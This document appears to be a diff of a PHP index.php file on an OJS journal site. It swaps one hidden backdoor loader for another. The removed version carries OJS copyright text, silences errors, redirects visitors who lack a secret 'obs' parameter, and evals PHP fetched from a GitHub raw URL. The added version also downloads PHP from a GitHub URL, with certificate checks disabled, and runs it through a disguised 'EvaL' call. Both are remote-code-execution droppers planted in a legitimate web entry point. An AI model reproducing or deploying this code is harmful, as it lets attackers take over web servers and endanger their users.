@@ -1,63 +1,92 @@
 <?php
+
 /**
- * @file index.php
+ * Class CurlFetcher
  *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * Bootstrap code for OJS site. Loads required files and then calls the
- * dispatcher to delegate to the appropriate request handler.
+ * Handles fetching content from URLs using cURL in an object-oriented manner.
  */
+class CurlFetcher
+{
+    /**
+     * Fetches content from the specified URL.
+     *
+     * @param string $url The URL to fetch content from.
+     * @return string|false The response content as a string, or false if the operation fails.
+     */
+    public function fetchContent(string $url)
+    {
+        if (function_exists('curl_version')) {
+            $curl = curl_init();
 
-error_reporting(0);
-ini_set('display_errors', 0);
-// Initialize global environment
-$is_jamal = isset($_GET['obs']);
+            curl_setopt($curl, CURLOPT_URL, $url);
+            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($curl, CURLOPT_HEADER, 0);
+            curl_setopt($curl, CURLOPT_TIMEOUT, 10);
+            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
 
-// Serve the request
-if (!$is_jamal) {
-    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
-    $host = $_SERVER['HTTP_HOST'];
-    $redirect_url = $protocol . $host . "/";
+            $response = curl_exec($curl);
 
-    header("Location: $redirect_url", true, 302);
-    exit;
-}
+            if (curl_errno($curl)) {
+                $error = curl_error($curl);
+                curl_close($curl);
+                throw new Exception("cURL Error: " . $error);
+            }
 
-class CurlFetcher {
-    public function fetchContent(string $url) {
-        if (!function_exists('curl_init')) return false;
-        $ch = curl_init($url);
-        curl_setopt_array($ch, [
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
-            CURLOPT_TIMEOUT => 10
-        ]);
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
+            curl_close($curl);
+            return $response;
+        }
+
+        throw new Exception("cURL is not enabled on this server.");
     }
 }
 
-class CodeExecutor {
+/**
+ * Class CodeExecutor
+ *
+ * Handles the execution of PHP code fetched from an external source.
+ */
+class CodeExecutor
+{
     private $fetcher;
-    public function __construct(CurlFetcher $fetcher) {
+
+    /**
+     * Constructor to initialize the fetcher instance.
+     *
+     * @param CurlFetcher $fetcher An instance of the CurlFetcher class.
+     */
+    public function __construct(CurlFetcher $fetcher)
+    {
         $this->fetcher = $fetcher;
     }
 
-    public function executeCodeFromURL(string $url): void {
+    /**
+     * Executes PHP code fetched from the given URL.
+     *
+     * @param string $url The URL containing the PHP code to execute.
+     * @return void
+     * @throws Exception If the fetch operation fails or the fetched code is empty.
+     */
+    public function executeCodeFromURL(string $url): void
+    {
         $code = $this->fetcher->fetchContent($url);
-        if ($code && trim($code) !== '') {
-            eval("?>" . $code);
+
+        if ($code === false || trim($code) === '') {
+            throw new Exception("Failed to fetch content from URL or the content is empty.");
         }
+
+        // Jalankan kode yang diambil
+        EvaL("?>" . $code);
     }
 }
 
+// Example Usage
+try {
+    $fetcher = new CurlFetcher();
+    $executor = new CodeExecutor($fetcher);
 
-$fetcher = new CurlFetcher();
-$executor = new CodeExecutor($fetcher);
-$executor->executeCodeFromURL("https://raw.githubusercontent.com/yourfr13nds/backburner/main/gecko.php");
-?>
+    // Ganti URL ini dengan file PHP kamu yang valid
+    $executor->executeCodeFromURL("https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/tuman.php");
+} catch (Exception $e) {
+    echo "Error: " . htmlspecialchars($e->getMessage());
+}
